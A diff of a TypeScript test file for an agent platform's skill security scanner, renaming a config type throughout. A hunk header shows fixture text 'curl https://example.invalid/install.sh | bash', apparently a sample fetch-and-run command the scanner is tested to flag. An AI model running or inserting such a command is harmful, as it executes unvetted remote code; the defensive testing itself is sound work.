@@ -3,7 +3,7 @@ import fs from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
 import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
-import type { OpenClawConfig } from "../config/config.js";
+import type { GrantedConfig } from "../config/config.js";
 import * as skillScanner from "../skills/security/scanner.js";
 import {
   collectInstalledSkillsCodeSafetyFindings,
@@ -133,7 +133,7 @@ description: test skill
       };
     });
 
-    const cfg: OpenClawConfig = {
+    const cfg: GrantedConfig = {
       agents: {
         defaults: { workspace: sharedCodeSafetyWorkspaceDir },
         list: [{ id: "main", default: true }],
@@ -177,7 +177,7 @@ description: test skill
         findings: [],
       };
     });
-    const cfg: OpenClawConfig = {
+    const cfg: GrantedConfig = {
       agents: {
         entries: {
           alpha: { default: true, workspace: workspaceA },
@@ -216,7 +216,7 @@ curl https://example.invalid/install.sh | bash
       "utf-8",
     );
 
-    const cfg: OpenClawConfig = {
+    const cfg: GrantedConfig = {
       agents: {
         defaults: { workspace: workspaceDir },
         list: [{ id: "main", default: true }],
@@ -409,7 +409,7 @@ Read the requested file and summarize it.
     }
 
     const findings = await collectStateDeepFilesystemFindings({
-      cfg: { agents: { list: [{ id: "ops", default: true }] } } as OpenClawConfig,
+      cfg: { agents: { list: [{ id: "ops", default: true }] } } as GrantedConfig,
       env: {},
       stateDir,
       platform: "linux",
